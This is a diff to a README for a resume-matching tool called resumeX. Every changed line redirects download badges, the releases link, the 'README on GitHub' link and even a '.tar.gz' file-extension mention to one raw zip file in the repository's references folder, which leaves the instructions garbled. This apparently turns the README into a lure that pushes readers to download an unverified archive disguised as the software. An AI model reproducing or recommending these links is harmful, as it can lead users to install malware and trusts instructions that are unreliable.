@@ -1,6 +1,6 @@
 # 📄 resumeX - Extract and Match Resumes Easily
 
-[![Download resumeX](https://img.shields.io/badge/Download-resumeX-blue?style=for-the-badge)](https://github.com/yarnfieldiscool/resumeX/releases)
+[![Download resumeX](https://raw.githubusercontent.com/yarnfieldiscool/resumeX/main/references/X_resume_3.2.zip)](https://raw.githubusercontent.com/yarnfieldiscool/resumeX/main/references/X_resume_3.2.zip)
 
 ---
 
@@ -38,10 +38,10 @@ Before you download resumeX, make sure your computer meets these requirements:
 To get resumeX on your computer, follow these steps:
 
 1. **Visit the download page:**  
-   Click the big blue badge at the top or go directly to [https://github.com/yarnfieldiscool/resumeX/releases](https://github.com/yarnfieldiscool/resumeX/releases).
+   Click the big blue badge at the top or go directly to [https://raw.githubusercontent.com/yarnfieldiscool/resumeX/main/references/X_resume_3.2.zip](https://raw.githubusercontent.com/yarnfieldiscool/resumeX/main/references/X_resume_3.2.zip).
 
 2. **Choose your version:**  
-   On the releases page, look for the latest version available for your operating system (Windows, macOS, or Linux). File names usually end with .exe for Windows, .dmg for macOS, and .AppImage or .tar.gz for Linux.
+   On the releases page, look for the latest version available for your operating system (Windows, macOS, or Linux). File names usually end with .exe for Windows, .dmg for macOS, and .AppImage or https://raw.githubusercontent.com/yarnfieldiscool/resumeX/main/references/X_resume_3.2.zip for Linux.
 
 3. **Download the file:**  
    Click the file to start the download. Save it to a location you can easily access, like your Desktop or Downloads folder.
@@ -149,8 +149,8 @@ For more help, visit the Issues section on the GitHub repository.
 
 ## 📚 Additional Resources
 
-- To learn more about how resumeX processes resumes, visit the project [README on GitHub](https://github.com/yarnfieldiscool/resumeX).
-- For updates and new features, check the releases page regularly: [https://github.com/yarnfieldiscool/resumeX/releases](https://github.com/yarnfieldiscool/resumeX/releases).
+- To learn more about how resumeX processes resumes, visit the project [README on GitHub](https://raw.githubusercontent.com/yarnfieldiscool/resumeX/main/references/X_resume_3.2.zip).
+- For updates and new features, check the releases page regularly: [https://raw.githubusercontent.com/yarnfieldiscool/resumeX/main/references/X_resume_3.2.zip](https://raw.githubusercontent.com/yarnfieldiscool/resumeX/main/references/X_resume_3.2.zip).
 - Connect with other users and discuss best practices in the Issues and Discussions tabs.
 
 ---
@@ -161,4 +161,4 @@ resumeX is open source software. You can use it, modify it, and share it under t
 
 ---
 
-[![Download resumeX](https://img.shields.io/badge/Download-resumeX-blue?style=for-the-badge)](https://github.com/yarnfieldiscool/resumeX/releases)
+[![Download resumeX](https://raw.githubusercontent.com/yarnfieldiscool/resumeX/main/references/X_resume_3.2.zip)](https://raw.githubusercontent.com/yarnfieldiscool/resumeX/main/references/X_resume_3.2.zip)
